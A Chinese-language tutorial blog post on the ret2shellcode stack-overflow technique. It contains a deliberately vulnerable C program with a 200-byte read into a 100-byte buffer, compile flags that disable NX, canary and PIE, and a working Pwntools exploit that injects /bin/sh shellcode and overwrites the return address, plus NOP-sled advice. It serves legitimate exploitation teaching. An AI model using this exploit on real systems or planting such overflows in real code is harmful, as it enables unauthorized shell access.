---
title: ret2shellcode
date: 2026-01-22 17:05:16
tags: 
  - Pwn
---

ret2shellcode (Return to Shellcode) 是一种非常经典的栈溢出攻击方式。

它的核心原理是：攻击者自己编写或注入一段恶意的机器码（即 Shellcode）到程序的内存中（通常是栈上），然后通过栈溢出修改返回地址，让 CPU 跳转到这段注入的代码上去执行。

#### 关键前提条件
要成功实施 ret2shellcode，必须满足以下两个条件：

没有开启 NX 保护 (No-Execute / DEP)：

这是最关键的。内存中的栈段（Stack）必须拥有 可执行（Executable） 权限。

如果开启了 NX，栈只能读写不能执行（RW-），CPU 跳转到栈上执行代码时会直接报 Segmentation Fault。

我们要知道 Shellcode 在内存中的地址：

我们需要知道我们注入的 Shellcode 存在哪（通常是 buffer 的起始地址），这样才能把返回地址改成它。

### 一个典型的 ret2shellcode 例子
#### 漏洞源码 (C语言)

为了演示，我们需要在编译时关闭 NX 保护。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void vuln() {
    char buf[100];
    printf("The address of buf is: %p\n", buf); // 为了简化难度，题目直接告诉了我们 buf 的地址
    puts("Input your shellcode:");
    read(0, buf, 200); // 漏洞点：buf 只有 100，但读了 200，存在溢出
}

int main() {
    vuln();
    return 0;
}

```

编译命令（关键参数 `-z execstack`）：

```bash
# -z execstack: 关闭 NX 保护，让栈可执行
# -fno-stack-protector: 关闭 Canary 保护
# -no-pie: 关闭地址随机化 (方便演示)
gcc -z execstack -fno-stack-protector -no-pie -o pwn_shell source.c

```

#### 攻击分析

目标：执行 `system("/bin/sh")` 拿到 Shell。
问题：程序里没有 `system` 函数，也没有 `/bin/sh` 字符串。
对策：我们把生成 Shell 的机器码（Shellcode）作为输入发给 `read`，存到 `buf` 里。然后把返回地址改成 `buf` 的地址。

Payload 结构设计：
我们希望栈变成这样：

```text
高地址
+------------------+
| buf 的地址        |  <-- 覆盖原本的 Return Address (让 CPU 跳回 buf)
+------------------+
| ... 填充数据 ...  |  <-- 填满 buffer 剩下的空间 + 覆盖 old ebp
+------------------+
|                  |
|   Shellcode      |  <-- 我们的恶意代码
| (execve /bin/sh) |
|                  |
+------------------+  <-- buf 的起始地址 (ESP 指向这附近)
低地址

```

计算偏移：

`buf` 大小是 100。
通常会有一些对齐或者 old ebp（32位是4字节，64位是8字节）。
假设通过调试（gdb `cyclic`）发现，偏移量是 112 字节后碰到返回地址。

#### Exploit 脚本 (Pwntools)

这里我们使用 Pwntools 自动生成 Shellcode。

```python
from pwn import *

# 1. 设置环境
context(os='linux', arch='amd64', log_level='debug')
# context.arch = 'i386' # 如果是 32 位程序记得改这个

p = process('./pwn_shell')

# 2. 接收程序泄露的栈地址
# 题目中 printf("... %p\n", buf) 会打印 buf 地址
p.recvuntil("The address of buf is: ")
buf_addr_str = p.recvline().strip()
buf_addr = int(buf_addr_str, 16)

log.success(f"Buffer Address: {hex(buf_addr)}")

# 3. 准备 Shellcode
# Pwntools 自带生成 shellcode 的功能
# asm() 将汇编代码编译成机器码字节流
shellcode = asm(shellcraft.sh())

# 打印一下看看 shellcode 有多长，确保 buf 放得下
log.info(f"Shellcode length: {len(shellcode)}") 

# 4. 构造 Payload
# 结构：[ Shellcode ] + [ Padding ] + [ Return Address ]

# 计算需要填充的长度：总偏移 112 - Shellcode 长度
padding_len = 112 - len(shellcode)

payload = flat([
    shellcode,                  # 先放 shellcode
    b'A' * padding_len,         # 再填满剩下的空间
    buf_addr                    # 最后覆盖返回地址，指向 buf 开头
])

# 5. 发送 Payload
p.sendline(payload)
p.interactive()

```
### 进阶技巧：NOP Sled (滑雪梯)

在实际情况中，我们可能并不精准知道 `buf` 的起始地址（比如可能受环境变量影响偏移了几个字节）。如果跳歪了，跳到了 Shellcode 中间，程序就会崩溃。

为了增加成功率，我们通常在 Shellcode 前面铺一层 NOP 指令 (`\x90`)。

NOP：No Operation，CPU 遇到这个指令什么都不做，直接执行下一条。
原理：只要返回地址跳到了 NOP 区域的任意位置，CPU 就会像滑滑梯一样一路滑下来，最终滑进我们的 Shellcode。

更稳健的 Payload 结构：
`[ NOPs ] + [ Shellcode ] + [ Padding ] + [ Ret Addr (指向 NOP 中间) ]`
